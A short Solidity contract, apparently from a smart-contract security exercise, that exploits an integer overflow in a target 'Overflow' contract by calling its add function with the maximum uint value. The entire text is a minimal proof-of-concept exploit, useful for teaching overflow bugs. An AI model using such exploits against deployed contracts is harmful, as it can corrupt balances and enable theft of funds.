
contract OverflowExploit {
    Overflow private target;

    constructor(address _target) {
        target = Overflow(_target);
    }

    function exploit() public {
        target.add(type(uint).max);
    }
}